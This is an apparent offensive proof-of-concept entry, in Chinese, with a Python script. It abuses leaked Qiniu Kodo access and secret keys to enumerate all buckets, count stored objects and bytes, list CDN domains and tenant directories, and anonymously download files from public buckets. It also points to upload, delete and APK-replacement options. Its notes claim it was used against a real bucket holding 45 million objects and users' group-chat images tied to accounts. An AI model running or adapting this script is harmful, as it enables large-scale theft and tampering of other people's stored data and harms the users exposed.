# 七牛 Kodo 泄露 AK/SK：全量枚举、精确计量与公开读桶匿名外带

- **code**: 七牛-kodo-泄露-ak-sk-全量枚举-精确计量与公开读桶匿名外带
- **kind**: script
- **category**: info-leak
- **component**: Qiniu Kodo
- **severity**: critical
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 目标 im-yg 桶实测：/v6/count 返回 45,529,864 个对象、/v6/space 返回 21,148,935,325,502 字节、rsf list 返回 373 个租户目录；example.com 无凭据 GET 群聊图片 9/9 返回 200，并与 memberId/账号/昵称/msgId 完成关联。
- **path**: pocs/七牛-kodo-泄露-ak-sk-全量枚举-精确计量与公开读桶匿名外带/poc.py
- **tags**: qiniu,kodo,object-storage,public-bucket,ak-sk,info-leak,cdn
- **created_at**: 2026-10-19T20:40:22.123Z

## 描述

拿到七牛 AK/SK 后：①QBox 签名规则是 urlsafe_b64(HMAC-SHA1(SK, "<path>[?<sorted_query>]\n"))，不含 HTTP 方法，带 GET 会 BadToken，urlsafe_base64 必须保留 '='；②/buckets、/bucket/<b> 取 private；③api.qiniu.com /v6/space 与 /v6/count（必带 begin/end/g=day）可直接给出精确存储字节数与对象数，是量化影响最快的接口；④rsf.target468.example.com /list 支持 prefix/delimiter/marker，delimiter=/ 拿租户目录；⑤public=0 的桶可用绑定 CDN 域匿名 GET 任意 key；⑥若同账号桶承载客户端 APK，即具备替换投毒面（需写权限）。

## 用法

```
先 /buckets 看账号下全部空间 → /bucket/<b> 判 private → /v6/count 与 /v6/space 精确量化 → /v6/domain/list 取绑定 CDN 域 → rsf list delimiter=/ 枚举租户目录 → 用 CDN 域匿名 GET 验证公开读。量化时优先用 /v6/* 而不是全量 list（45M 对象全列需数万次调用）。
```

## 正文

```
import requests, hmac, hashlib, base64, json, urllib.parse

AK = "<AccessKey>"; SK = "<SecretKey>"; B = "<bucket>"
def ub(x): return base64.urlsafe_b64encode(x).decode()
def sign(s): return "QBox %s:%s" % (AK, ub(hmac.new(SK.encode(), s, hashlib.sha1).digest()))
def canon(p): return urllib.parse.urlencode(sorted(p.items())) if p else ""
def api(method, host, path, params=None, data=None, ctype="application/x-www-form-urlencoded"):
    q = canon(params); full = path + ("?" + q if q else "")
    ad = (full + "\n" + ctype + "\n" + data.decode()).encode() if (method=="POST" and data is not None) else (full+"\n").encode()
    h={"Authorization": sign(ad)}
    if data is not None: h["Content-Type"]=ctype
    return requests.request(method, host+full, headers=h, data=data, timeout=60)

print(api("GET","https://rs.qiniu.com","/buckets").text)
print(api("GET","https://rs.qiniu.com","/bucket/"+B).text)              # private:0/1
print(api("GET","https://api.qiniu.com","/v6/count",{"bucket":B,"begin":"2026-10-18","end":"2026-10-20","g":"day"}).text)
print(api("GET","https://api.qiniu.com","/v6/space",{"bucket":B,"begin":"2026-10-18","end":"2026-10-20","g":"day"}).text)
print(api("GET","https://api.qiniu.com","/v6/domain/list",{"tbl":B}).text)
print(api("GET","https://target465.example.com","/list",{"bucket":B,"delimiter":"/","limit":1000}).text[:800])
# 匿名读（无需任何凭据）：https://<绑定CDN域>/<key>
print(requests.get("https://<cdn-domain>/"+"/".join(["<tenant>","wx","<date>","<uuid>.png"]), timeout=60).status_code)
# 写/删（有权限时）：upload_token policy {"scope": B+":"+key, "deadline": now+3600}
# 删除：POST https://rs.qiniu.com/delete/<urlsafe_b64("bucket:key")>

```
